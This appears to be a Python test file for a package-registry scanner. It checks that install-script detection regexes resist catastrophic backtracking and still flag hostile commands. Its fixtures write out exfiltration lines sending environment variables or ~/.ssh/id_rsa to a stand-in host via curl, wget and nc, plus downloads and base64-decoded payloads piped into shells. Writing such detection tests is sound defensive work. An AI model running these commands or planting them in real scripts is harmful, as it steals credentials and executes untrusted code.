"""install_script_risk's shell patterns run in linear time.

Install scripts are written by the package author, so the patterns that read
them must not be steerable into catastrophic backtracking:

- The curl/wget option group `(?:-{1,2}[\\w-]+(?:[ =]\\S+)?\\s+)*` could split
  `--a-b` two ways and take the next option as a value or not: `curl` and
  18 options `--a-b` took over 20 s (exponential), and `curl -a ` repeated
  20,000 times was quadratic.
- The pipe-into-shell pattern rescanned the rest of the command from every
  `curl`: a line of 100,000 `curl ` never finished.

Either hung `lazaret-registry scan` (and the MCP worker) on one hostile
package. The rewrite matches the same commands; adversarial inputs are run
in a child process with a timeout so a regression fails instead of hanging.
"""

import os
import subprocess
import sys
import unittest

from lazaret.registry import repo
from lazaret.scanner import core
from tests import _support

CHILD = r"""
import json, sys, time
from lazaret.registry import repo
from tests.registry._review_support import hooks, scan_npm
cases = {
    "options that split two ways": "curl " + "--a-b " * 25 + "x",
    "many curl options": "curl -a " * 20000,
    "many curl words": "curl " * 100000,
    "many netcat options": "-nc " * 50000,
    "many pipes into a shell": "| sh " * 200000,
}
worst = 0.0
for label, text in cases.items():
    t = time.monotonic()
    repo.install_script_risk(text)
    worst = max(worst, time.monotonic() - t)
t = time.monotonic()
res = scan_npm({"package.json": hooks(postinstall="node install.js"),
                "install.js": "// " + "curl " + "--a-b " * 25 + "x\n"})
worst = max(worst, time.monotonic() - t)
print(json.dumps({"worst": worst, "verdict": res["verdict"]}))
"""


class LinearTimeTests(unittest.TestCase):
    def test_adversarial_inputs_finish_quickly(self):
        env = dict(os.environ, PYTHONPATH=os.pathsep.join(
            filter(None, [_support.SRC, os.path.dirname(_support.SRC), os.environ.get("PYTHONPATH")])))
        out = subprocess.run([sys.executable, "-c", CHILD], capture_output=True, text=True,
                             encoding="utf-8", errors="replace", env=env, timeout=30)
        self.assertEqual(out.returncode, 0, out.stderr[-2000:])
        result = __import__("json").loads(out.stdout.strip().splitlines()[-1])
        self.assertLess(result["worst"], 5.0)
        self.assertEqual(result["verdict"], "WARN")


class SameCommandsTests(unittest.TestCase):
    NETWORK_WITH_ENV = (
        "curl --retry=3 --data \"$(env)\" -X POST https://collector.invalid\n",
        "curl -s -o - -d \"$(printenv)\" https://collector.invalid\n",
        "env | wget --header=\"A:b\" --post-file=- https://collector.invalid\n",
        "cat ~/.ssh/id_rsa | nc -q1 collector.invalid 4444\n",
        "printenv | curl -sS -X POST --data-binary @- 'https://collector.invalid/x'\n",
    )
    PIPES = ("curl -fsSL https://files.invalid/i.sh | sh\n",
             "wget -qO- https://files.invalid/i.sh|zsh\n",
             "curl -s https://files.invalid/i.sh | sudo bash -s -- -y\n",
             # (2.30: a shell named by its path)
             "wget -O - https://files.invalid/i.sh | /bin/bash &\n",
             "curl -s https://files.invalid/i.sh | /usr/bin/env sh\n",
             "curl -s https://files.invalid/i.sh | sudo /usr/local/bin/zsh\n")
    NOT_PIPES = ("curl -o x https://files.invalid/x.tgz | tee log | sh\n",
                 "curl https://files.invalid/x || sh fallback.sh\n",
                 "curl -O https://files.invalid/x.tgz; sh build.sh\n",
                 "echo curl | shasum\n",
                 "echo curl | /usr/bin/shasum\n",
                 "curl -s https://files.invalid/x.json | /usr/local/bin/jq .\n")

    def test_network_and_environment(self):
        # (0.1.8: a shell script is read by the shell reader: what each command sends)
        for text in self.NETWORK_WITH_ENV:
            with self.subTest(text=text[:40]):
                self.assertIn("uploads a local file over the network (~/.ssh/id_rsa)" if "id_rsa" in text
                              else "sends environment variables over the network (the whole environment)",
                              repo.install_script_risk(text))

    def test_download_piped_into_a_shell(self):
        for text in self.PIPES:
            with self.subTest(text=text[:40]):
                self.assertIn("pipes a download into a shell", repo.install_script_risk(text))
        for text in self.NOT_PIPES:
            with self.subTest(text=text[:40]):
                self.assertNotIn("pipes a download into a shell", repo.install_script_risk(text))

    # 2.39 (N-4): what a pipeline decodes, or downloads, and hands a shell or an interpreter on stdin
    DECODED = ("echo Y3VybCB4IHwgc2g= | base64 -d | sh\n", "echo X | base64 --decode | gunzip | bash\n",
               "bash -c \"$(echo X | base64 -d)\"\n", "echo 6375726c | xxd -r -p | sh\n",
               "openssl base64 -d -A <<< X | python3\n")
    DOWNLOADED = ("curl -sSf https://files.invalid/x.py | sudo python3\n", "wget -qO- https://files.invalid/x.js | node -\n")
    NOT_RUN = ("echo X | base64 -d > out.bin\n", "echo X | base64 | sh\n",
               "curl -s https://files.invalid/v.json | python3 -m json.tool\n",
               "curl -s https://files.invalid/v.json | python3 -c 'import sys; print(sys.stdin.read())'\n",
               "curl -s https://files.invalid/x.py -o x.py; python3 -V\n")

    def test_code_decoded_or_downloaded_and_piped_into_what_runs_it(self):
        for text in self.DECODED:
            with self.subTest(text=text[:40]):
                self.assertTrue(any(r.startswith("pipes code it decodes into ") for r in repo.install_script_risk(text)))
                self.assertEqual(core.hook_command_risk(text.strip())[:1] != [], True)
        for text in self.DOWNLOADED:
            with self.subTest(text=text[:40]):
                self.assertTrue(any(r.startswith("downloads a script and runs it with ") for r in repo.install_script_risk(text)))
        for text in self.NOT_RUN:
            with self.subTest(text=text[:40]):
                self.assertFalse([r for r in repo.install_script_risk(text)
                                  if r.startswith(("pipes code it decodes", "downloads a script and runs it"))])
        # in an npm install hook: CRITICAL, as a hook that pipes a download into a shell is
        issues = core.scan_manifest("package.json", '{"scripts": {"postinstall": "echo X | base64 -d | sh"}}', registry=True)
        self.assertEqual([(i["rule"], i["sev"]) for i in issues], [("SC-INSTALL-HOOK", "CRITICAL")])
        self.assertIn("pipes code it decodes into sh", issues[0]["msg"])
        # and in code that hands a shell the command line
        self.assertIn("pipes code it decodes into bash", core.exec_command_reasons(
            "require('child_process').execSync('echo X | base64 -d | bash');\n"))

    def test_prose_is_not_a_download(self):
        self.assertEqual(repo.install_script_risk(
            "// curl is great; see https://curl.se\nconst env = Object.keys(process.env);\n"), [])


if __name__ == "__main__":
    unittest.main()
